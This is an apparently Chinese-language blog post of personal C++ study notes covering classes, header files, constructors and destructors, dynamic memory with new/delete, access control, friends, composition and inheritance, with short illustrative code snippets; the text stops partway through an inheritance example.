<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//类的定义 以及函数声明 (构造函数)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TicketMachine</span> &#123;</span></span><br><span class="line">    pubic:</span><br><span class="line">    	<span class="built_in">TicketMachine</span>(); <span class="comment">//不用管</span></span><br><span class="line">    	<span class="keyword">virtual</span> ~<span class="built_in">TicketMachine</span>(); <span class="comment">//不用管</span></span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">showPrompt</span><span class="params">()</span></span>; <span class="comment">//</span></span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">insertmoney</span><span class="params">(<span class="keyword">int</span> money)</span></span>;</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">showbalance</span><span class="params">()</span></span>;</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">printTicket</span><span class="params">()</span></span>;</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">showTotal</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    	<span class="keyword">const</span> <span class="keyword">int</span> PRICE; <span class="comment">//const 需要初始化</span></span><br><span class="line">    	<span class="keyword">int</span> balance;</span><br><span class="line">    	<span class="keyword">int</span> total;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 函数的定义 (解析函数) 类名::函数()&#123; //TODO something;&#125; </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TicketMachine::showPrompt</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;something&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TicketMachine::insertMoney</span><span class="params">(<span class="keyword">int</span> money)</span></span>&#123;</span><br><span class="line">    balance +=money <span class="comment">//balance 类成员变量;money 用户赋予的值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在main函数中使用</span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">main</span>()&#123;</span><br><span class="line">    TicketMachine tm;</span><br><span class="line">    tm.balance = <span class="number">0</span>;</span><br><span class="line">    tm.<span class="built_in">insertMoney</span>(<span class="number">100</span>);</span><br><span class="line">    tm.<span class="built_in">showBalance</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">printf: <span class="number">100</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="第五章-头文件"><a href="#第五章-头文件" class="headerlink" title="第五章 头文件"></a>第五章 头文件</h1><blockquote>
<ul>
<li>In C++,separated .h and .cpp files are used to define one class</li>
<li>Class declaretion and prototypes in that class are in the header file (.h). ///prototypes: 函数原型 在头文件中声明 类和函数原型</li>
<li>All the bodies(definitions) of these functions are in the source file (.cpp) 在函数主体中定义类</li>
</ul>
</blockquote>
<h2 id="The-header-files"><a href="#The-header-files" class="headerlink" title="The header files"></a>The header files</h2><h3 id="Structure-of-C-program"><a href="#Structure-of-C-program" class="headerlink" title="Structure of C++ program"></a>Structure of C++ program</h3><h1 id="编译预处理"><a href="#编译预处理" class="headerlink" title="(编译预处理)"></a>(编译预处理)</h1><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220730003555699.png" alt="image-20220730003555699"></p>
<blockquote>
<h1 id="include-指文本插入"><a href="#include-指文本插入" class="headerlink" title="include 指文本插入"></a>include 指文本插入</h1></blockquote>
<h2 id="Declararions-vs-Definitions-那些东西是声明（declaration）-那些东西是定义（definitions）？"><a href="#Declararions-vs-Definitions-那些东西是声明（declaration）-那些东西是定义（definitions）？" class="headerlink" title="Declararions vs. Definitions (那些东西是声明（declaration） 那些东西是定义（definitions）？)"></a>Declararions vs. Definitions (那些东西是声明（declaration） 那些东西是定义（definitions）？)</h2><ul>
<li>A.cpp file is a compile unit</li>
<li>Only declarations are allowed to be in .h<ul>
<li>extern variables</li>
<li>function prototypes （没有大括号-&gt; 原型）(有大括号 -&gt; 定义)</li>
<li>class/struct declaration</li>
</ul>
</li>
</ul>
<p>在头文件中放 Defintion 容易出现 duplication 问题                                                                                              </p>
<h2 id="include"><a href="#include" class="headerlink" title="#include"></a>#include</h2><ul>
<li><h1 id="include-is-to-insert-the-included-file-into-the-cpp-file-at-where-the-include-statement-is"><a href="#include-is-to-insert-the-included-file-into-the-cpp-file-at-where-the-include-statement-is" class="headerlink" title="include is to insert the included file into the .cpp file at where the #include statement is."></a>include is to insert the included file into the .cpp file at where the #include statement is.</h1><ul>
<li><h1 id="include”xx-h”-first-search-in-the-current-directory-then-the-direcories（目录）-declared-somewhere"><a href="#include”xx-h”-first-search-in-the-current-directory-then-the-direcories（目录）-declared-somewhere" class="headerlink" title="include”xx.h” :first search in the current directory, then the direcories（目录） declared somewhere"></a>include”xx.h” :first search in the current directory, then the direcories（目录） declared somewhere</h1></li>
<li><h1 id="include-search-in-the-specified-direcories（目录）"><a href="#include-search-in-the-specified-direcories（目录）" class="headerlink" title="include : search in the specified direcories（目录）"></a>include<xx.h> : search in the specified direcories（目录）</xx.h></h1></li>
<li><h1 id="include-lt-xx-gt-same-as-include"><a href="#include-lt-xx-gt-same-as-include" class="headerlink" title="include&lt; xx &gt; :same as #include "></a>include&lt; xx &gt; :same as #include <xx.h></xx.h></h1></li>
</ul>
</li>
</ul>
<h2 id="Standard-header-file-structure"><a href="#Standard-header-file-structure" class="headerlink" title="Standard header file structure"></a>Standard header file structure</h2><h1 id="ifndef-…-条件编译"><a href="#ifndef-…-条件编译" class="headerlink" title="ifndef … (条件编译)"></a>ifndef … (条件编译)</h1><h1 id="define-…"><a href="#define-…" class="headerlink" title="define …**"></a>define …<em>**</em></h1><h1 id="endif-（宏定义）"><a href="#endif-（宏定义）" class="headerlink" title="endif //（宏定义）"></a>endif //（宏定义）</h1><h2 id="Tips-for-header"><a href="#Tips-for-header" class="headerlink" title="Tips for header"></a>Tips for header</h2><ol>
<li>One class declaration per header file </li>
<li>Associated with one source file in the same prefix of file name.</li>
<li>The contentsof aheader file is surrounded with #ifnedf  #define   #endlf</li>
</ol>
<p>绝对不允许 #include<xx.cpp> (.cpp 里全是body(definition)容易造成重复)  </xx.cpp></p>
<h1 id="第六章时钟的例子"><a href="#第六章时钟的例子" class="headerlink" title="第六章时钟的例子"></a>第六章时钟的例子</h1><h3 id="Clock-display"><a href="#Clock-display" class="headerlink" title="Clock display"></a>Clock display</h3><ul>
<li>Abstraction is the ability to ignore details of parts to focus attention on a higher level of a problem.</li>
<li>Modularization is the process of dividing a whole into well-defined ways.</li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220802005921923.png" alt="image-20220802005921923"></p>
<h2 id="implementation-NumberDisplay"><a href="#implementation-NumberDisplay" class="headerlink" title="implementation - NumberDisplay"></a>implementation - NumberDisplay</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NumberDisplay</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> limit;</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="comment">//Constructor and methods omitted 省略结构和方法...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="第六章-成员变量"><a href="#第六章-成员变量" class="headerlink" title="第六章 成员变量"></a>第六章 成员变量</h1><h2 id="Local-variable"><a href="#Local-variable" class="headerlink" title="Local variable"></a>Local variable</h2><ul>
<li>Local various are defined inside a method,have a scope limited to the method to which they belong.(在一个函数里面定义的变量为本地变量)；（本地变量有本地变量的作用域）；）</li>
</ul>
<p>与之相反有成员变量，在类中定义。</p>
<h2 id="A-local-varible-of-the-same-as-a-field-will-present-the-field-being-accessed-from-within-a-method"><a href="#A-local-varible-of-the-same-as-a-field-will-present-the-field-being-accessed-from-within-a-method" class="headerlink" title="A local varible of the same as a field will present the field being accessed from within a method"></a>A local varible of the same as a field will present the field being accessed from within a method</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220804231613660.png" alt="image-20220804231613660"></p>
<p>Field(成员变量), parameters（参数）, local variables（本地变量）</p>
<p><strong>类内声明，类外定义</strong></p>
<p>Field is in the class like function.</p>
<p>parameters==local variables (进入函数之前，这些东西都存在，离开之后都不存在)—-(存在堆栈中)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    	<span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">A::f</span><span class="params">()</span></span>&#123;</span><br><span class="line">    i=<span class="number">20</span>;</span><br><span class="line">    std::cout&lt;&lt;i&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    A a;</span><br><span class="line">    A b;</span><br><span class="line">    std::cout&lt;&lt;a.i&lt;&lt;std::endl;</span><br><span class="line">    a.<span class="built_in">f</span>(); <span class="comment">// f() 是类A的f()，不是a的f(); a做f()的动作, 但f()所做的对象为a.i</span></span><br><span class="line">	b.<span class="built_in">f</span>();<span class="comment">//同理 f()是类A的f(),与上面a.f()为调用同一个函数,但是f()知道所做的对象为b.i  就相当于传一个指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="类是一个概念，一种观点"><a href="#类是一个概念，一种观点" class="headerlink" title="类是一个概念，一种观点"></a>类是一个概念，一种观点</h2><h2 id="Call-functions-in-a-class"><a href="#Call-functions-in-a-class" class="headerlink" title="Call functions in a class"></a>Call functions in a class</h2><h2 id="this-the-hidden-parameters-pointer-to-caller"><a href="#this-the-hidden-parameters-pointer-to-caller" class="headerlink" title="this: the hidden parameters, pointer to caller"></a>this: the hidden parameters, pointer to caller</h2><h2 id="this-is-a-hidden-parameter-for-all-member-functions-with-the-type-of-the-class"><a href="#this-is-a-hidden-parameter-for-all-member-functions-with-the-type-of-the-class" class="headerlink" title="this is a hidden parameter for all member functions with the type of the class"></a><strong>this</strong> is a hidden parameter for all member functions with the type of the class</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Point::printf</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    -&gt;<span class="params">(can be regarded as)</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Point::print</span><span class="params">(Point  *p)</span></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>
<h2 id="c-翻译器-c-的特性如何用c语言表达出来"><a href="#c-翻译器-c-的特性如何用c语言表达出来" class="headerlink" title="c++ 翻译器 c++的特性如何用c语言表达出来"></a>c++ 翻译器 c++的特性如何用c语言表达出来</h2><h3 id="To-call-the-funciton-you-must-specify-a-variable"><a href="#To-call-the-funciton-you-must-specify-a-variable" class="headerlink" title="To call the funciton, you must specify a variable;"></a>To call the funciton, you must specify a variable;</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Point a;</span><br><span class="line">a.<span class="built_in">print</span>();</span><br><span class="line">	-&gt;(can be regarded as)</span><br><span class="line">Point::<span class="built_in">print</span>(&amp;a);</span><br></pre></td></tr></table></figure>
<h2 id="this-pointer-to-the-caller"><a href="#this-pointer-to-the-caller" class="headerlink" title="this: pointer to the caller."></a>this: pointer to the caller.</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220805000818444.png" alt="image-20220805000818444"></p>
<h1 id="第7章-构造和析构"><a href="#第7章-构造和析构" class="headerlink" title="第7章 构造和析构"></a>第7章 构造和析构</h1><h2 id="Point-init"><a href="#Point-init" class="headerlink" title="Point::init()"></a>Point::init()</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">class <span class="title">Point</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>;</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">(<span class="keyword">int</span> dx,<span class="keyword">int</span> dx)</span></span>;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    	<span class="keyword">int</span> x;</span><br><span class="line">    	<span class="keyword">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line">Point a;</span><br><span class="line">a.<span class="built_in">init</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">a.<span class="built_in">move</span>(<span class="number">2</span>,<span class="number">2</span>);</span><br><span class="line">a.<span class="built_in">print</span>();</span><br><span class="line"><span class="comment">//&quot;烫烫烫&quot;-&gt;未初始化</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220806082635365.png" alt="image-20220806082635365"></p>
<h2 id="Constructor-构造器-构造函数"><a href="#Constructor-构造器-构造函数" class="headerlink" title="Constructor (构造器/构造函数)"></a>Constructor (构造器/构造函数)</h2><h2 id="How-constructor-does"><a href="#How-constructor-does" class="headerlink" title="How constructor does?"></a>How constructor does?</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">public</span>:   	</span><br><span class="line">    	<span class="built_in">A</span>();</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    	<span class="keyword">int</span> i;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line">A::<span class="built_in">A</span>()&#123;</span><br><span class="line">    i=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220806083703130.png" alt="image-20220806083703130"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220806084045493.png" alt="image-20220806084045493"></p>
<h2 id="Constructor-是可以传参数"><a href="#Constructor-是可以传参数" class="headerlink" title="Constructor 是可以传参数"></a>Constructor 是可以传参数</h2><h2 id="destructor-析构器-析构函数"><a href="#destructor-析构器-析构函数" class="headerlink" title="destructor (析构器,析构函数)"></a>destructor (析构器,析构函数)</h2><blockquote>
<ul>
<li>In C++, cleanup is as important as initialization and is therefore guaranteed with the destructor</li>
<li>The destrucor is named after the name of the class with a leading tilde (~). The destructor never has any arguments.</li>
</ul>
</blockquote>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220806085227937.png" alt="image-20220806085227937"></p>
<p><strong>called</strong>(调用)</p>
<h1 id="第八章-对象初始化"><a href="#第八章-对象初始化" class="headerlink" title="第八章 对象初始化"></a>第八章 对象初始化</h1><h2 id="Storage-allocation"><a href="#Storage-allocation" class="headerlink" title="Storage allocation"></a>Storage allocation</h2><p>c语言可以在函数任何的地方定义变量</p>
<hr>
<p>在哪定义的就在哪执行构造函数</p>
<h2 id="Aggregate-initialization"><a href="#Aggregate-initialization" class="headerlink" title="Aggregate initialization"></a>Aggregate initialization</h2><blockquote>
<ul>
<li><p>int a[5] ={1,2,3,,4,5}</p>
</li>
<li><p>int b[6]={5]};</p>
</li>
<li>……</li>
</ul>
</blockquote>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220807201734992.png" alt="image-20220807201734992"></p>
<h2 id="The-default-constructor"><a href="#The-default-constructor" class="headerlink" title="The default constructor"></a>The default constructor</h2><blockquote>
<p>构造函数没有参数就叫 default constructor</p>
</blockquote>
<h1 id="第九章-Dynamic-memory-allocation-动态分配"><a href="#第九章-Dynamic-memory-allocation-动态分配" class="headerlink" title="第九章 Dynamic memory allocation 动态分配"></a>第九章 Dynamic memory allocation 动态分配</h1><blockquote>
<ul>
<li><p>new</p>
<ul>
<li>new int;</li>
<li>new Stash;</li>
<li>new int[10]</li>
</ul>
</li>
<li><p>delete</p>
<ul>
<li>delete p;</li>
<li>delete[] p;</li>
</ul>
</li>
</ul>
</blockquote>
<h2 id="任何运算符都有结果-结果都是地址"><a href="#任何运算符都有结果-结果都是地址" class="headerlink" title="(任何运算符都有结果 结果都是地址)"></a>(任何运算符都有结果 结果都是地址)</h2><ul>
<li>new is the way to allocate memory as a program runs. Pointers become the only access to that memory</li>
<li>delete enables you to return memory to the memory pool when you are finished with it.</li>
<li>Example arraynew.cpp</li>
</ul>
<p>new 的方式申请数组</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> * psome = <span class="keyword">new</span> <span class="keyword">int</span> [<span class="number">10</span>];</span><br><span class="line"><span class="keyword">delete</span> [] psome; <span class="comment">//若不带方括号 delete psome  析构只调用第一个变量</span></span><br><span class="line">Student *q = <span class="keyword">new</span> <span class="built_in">Student</span>();</span><br><span class="line">Student *r = <span class="keyword">new</span> Student[<span class="number">10</span>]; </span><br><span class="line"><span class="keyword">delete</span> p;</span><br></pre></td></tr></table></figure>
<h3 id="Tips-for-new-and-delete"><a href="#Tips-for-new-and-delete" class="headerlink" title="Tips  for new and delete"></a>Tips  for new and delete</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> p;</span><br><span class="line">a++;</span><br><span class="line"><span class="keyword">delete</span>[] a; <span class="comment">//回收失败 ,找不到其实地址</span></span><br><span class="line"><span class="keyword">delete</span> q;</span><br><span class="line"><span class="keyword">delete</span> r; <span class="comment">//空间会回收但是 只调用一次析构</span></span><br><span class="line"><span class="keyword">delete</span>[] r;<span class="comment">//空间会回收但是 会调用n一次析构</span></span><br></pre></td></tr></table></figure>
<h3 id="Tips-for-new-and-delete-1"><a href="#Tips-for-new-and-delete-1" class="headerlink" title="Tips for new and delete"></a>Tips for new and delete</h3><ul>
<li>不要用 <strong>delete</strong> 回收 未使用<strong>new</strong>的内存</li>
<li><p>如上</p>
</li>
<li><p>delete 一个空指针/未调用的变量是安全的</p>
</li>
</ul>
<p>申请内存没有释放容易有内存泄露</p>
<p>new后-&gt; 最好要delete</p>
<h1 id="第十章-访问限制-Setting-limit"><a href="#第十章-访问限制-Setting-limit" class="headerlink" title="第十章 访问限制 Setting limit"></a>第十章 访问限制 Setting limit</h1><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220811063157020.png" alt="image-20220811063157020"></p>
<p>C++ access control</p>
<ul>
<li>public 任何人都可以访问</li>
<li>private 只有自己(这个类的成员函数)能够调用 /// 同一个类的实例化对象之间可以互相访问私有成员</li>
<li>protected</li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220811064109686.png" alt="image-20220811064109686"></p>
<h2 id="Friends"><a href="#Friends" class="headerlink" title="Friends"></a>Friends</h2><p>不同类声明 Friends 可以获得访问private权限</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    	<span class="keyword">int</span> i;</span><br><span class="line">   	<span class="keyword">public</span>:</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">initialize</span><span class="params">()</span></span>;</span><br><span class="line">    	<span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">g</span><span class="params">(X*,<span class="keyword">int</span>)</span></span>; <span class="comment">// g函数访问 X的private</span></span><br><span class="line">    	<span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">Y::f</span><span class="params">(X*)</span></span>;<span class="comment">// Y类的f函数访问 X的private</span></span><br><span class="line">    	<span class="keyword">friend</span> <span class="class"><span class="keyword">struct</span> <span class="title">Z</span>;</span><span class="comment">// 整个Z类函数访问 X的private</span></span><br><span class="line">    	<span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">h</span><span class="params">()</span></span>; <span class="comment">//h函数能访问 X的private</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="Class-vs-Struct"><a href="#Class-vs-Struct" class="headerlink" title="Class vs Struct"></a>Class vs Struct</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220811065106709.png" alt="image-20220811065106709"></p>
<blockquote>
<p>Default value: 缺省值</p>
</blockquote>
<h2 id="初始化列表-Initializter-list"><a href="#初始化列表-Initializter-list" class="headerlink" title="初始化列表  Initializter list"></a>初始化列表  Initializter list</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">A</span>():<span class="built_in">p</span>(<span class="number">0</span>) <span class="comment">//构造函数:变量(初始值)</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220811233031260.png" alt="image-20220811233031260"></p>
<h2 id="Initialization-vs-assignment-初始化-vs-赋值"><a href="#Initialization-vs-assignment-初始化-vs-赋值" class="headerlink" title="Initialization vs. assignment (初始化 vs 赋值)"></a>Initialization vs. assignment (初始化 vs 赋值)</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220811233156493.png" alt="image-20220811233156493"></p>
<h1 id="第十章-对象组合-软件重用"><a href="#第十章-对象组合-软件重用" class="headerlink" title="第十章 对象组合 软件重用"></a>第十章 对象组合 软件重用</h1><h2 id="Composition-construct-new-object-with-existing-objects"><a href="#Composition-construct-new-object-with-existing-objects" class="headerlink" title="Composition: construct new object with existing objects"></a>Composition: construct new object with existing objects</h2><h2 id="It-is-the-relationship-of-“has-a”"><a href="#It-is-the-relationship-of-“has-a”" class="headerlink" title="It is the relationship of “has-a”"></a>It is the relationship of “has-a”</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220811233911461.png" alt="image-20220811233911461"></p>
<h2 id="父类-对象在里头-by-reference-指针"><a href="#父类-对象在里头-by-reference-指针" class="headerlink" title="父类(对象在里头)/by reference(指针)"></a>父类(对象在里头)/by reference(指针)</h2><h2 id="Ways-of-inclusion"><a href="#Ways-of-inclusion" class="headerlink" title="Ways of inclusion"></a>Ways of inclusion</h2><ul>
<li>fully</li>
<li>By reference</li>
</ul>
<h2 id="组合的对象依然有独立的作用"><a href="#组合的对象依然有独立的作用" class="headerlink" title="组合的对象依然有独立的作用"></a>组合的对象依然有独立的作用</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">///Example; All Constructors can have initialization lis</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span>&#123;</span>...&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Currency</span>&#123;</span>...&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SavingsAccount</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">SavingsAccount</span>( <span class="keyword">const</span> <span class="keyword">char</span> * name,<span class="keyword">const</span> <span class="keyword">char</span>*address, <span class="keyword">int</span> cents);</span><br><span class="line">        ~<span class="built_in">SavingAccount</span>();</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">printf</span><span class="params">()</span></span>;</span><br><span class="line">  	<span class="keyword">private</span>:</span><br><span class="line">    	person m_saver;</span><br><span class="line">    	Currency m_balance;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">SavingsAccount::<span class="built_in">SavingAccount</span>( <span class="keyword">const</span> <span class="keyword">char</span> * name, <span class="keyword">const</span> <span class="keyword">char</span> * address, <span class="keyword">int</span> cents):<span class="built_in">m_saver</span>(name,addrss),<span class="built_in">m_balance</span>(<span class="number">0</span>,cents)&#123;...&#125; <span class="comment">//构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SavingAccount::print</span><span class="params">()</span> </span>&#123; </span><br><span class="line">	m_sever.<span class="built_in">print</span>();</span><br><span class="line">    m_balance.<span class="built_in">print</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220811235659945.png" alt="image-20220811235659945"></p>
<p>​    若是</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220811235849208.png" alt="image-20220811235849208"></p>
<p>若public了, 则可以在 main函数(或者其他函数,反正就是外面)初始化</p>
<p>private 需要在构造函数的” : “ 初始化.</p>
<h2 id="语言都是很灵活的-某些灵活的特性也不见得好用"><a href="#语言都是很灵活的-某些灵活的特性也不见得好用" class="headerlink" title="语言都是很灵活的, 某些灵活的特性也不见得好用."></a>语言都是很灵活的, 某些灵活的特性也不见得好用.</h2><h1 id="第十一章-继承"><a href="#第十一章-继承" class="headerlink" title="第十一章 继承"></a>第十一章 继承</h1><h2 id="Reusing-the-interface"><a href="#Reusing-the-interface" class="headerlink" title="Reusing the interface"></a>Reusing the interface</h2><p>继承 -&gt; 用类 拼出一个类(概念)</p>
<p>组合 -&gt; 用对象 组合出新的对象(实体)</p>
<blockquote>
<p>Inheritance is to take the exsting class, clone it, and then make additons and modification to the clone</p>
</blockquote>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220813010704562.png" alt="image-20220813010704562"></p>
<h2 id="Inheritance-继承"><a href="#Inheritance-继承" class="headerlink" title="Inheritance (继承)"></a>Inheritance (继承)</h2><ul>
<li>Language Implementation technique</li>
<li>Also an important component of the OO design methodology</li>
<li>Allows sharing of design for<ul>
<li>Member data</li>
<li>member functions</li>
<li>Interfaces</li>
</ul>
</li>
<li>Key technology in C++</li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220813011030497.png" alt="image-20220813011030497"></p>
<p>one class (学生student)  another class(人person) 学生继承了人的一种属性</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220813011528217.png" alt="image-20220813011528217"></p>
<ul>
<li>Base Class (基类)</li>
<li>Super Class (超类)</li>
<li><p>Parent Clas (父类)</p>
</li>
<li><p>Derived Class (派生类)</p>
</li>
<li>Sub Class (子类)</li>
<li>Child Class (子类)</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    	<span class="built_in">A</span>():<span class="built_in">i</span>(<span class="number">0</span>) &#123; cout &lt;&lt; <span class="string">&quot;A::A()&quot;</span>&lt;&lt;endl; &#125;</span><br><span class="line">        ~<span class="built_in">A</span>()&#123; cout&lt;&lt;<span class="string">&quot;~A::A()&quot;</span>&lt;&lt;endl; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; cout&lt;&lt;<span class="string">&quot;A::print(): &quot;</span>&lt;&lt;i&lt;&lt;endl; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> ii)</span> </span>&#123; i=ii; &#125;</span><br><span class="line">    <span class="keyword">private</span> :</span><br><span class="line">        <span class="keyword">int</span> i;   	</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span> <span class="keyword">public</span> A &#123; <span class="comment">// B类就作为A的子类</span></span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    B b;</span><br><span class="line">    b.<span class="built_in">set</span>(<span class="number">10</span>);</span><br><span class="line">    b.<span class="built_in">print</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* cout:</span></span><br><span class="line"><span class="comment">A::A()</span></span><br><span class="line"><span 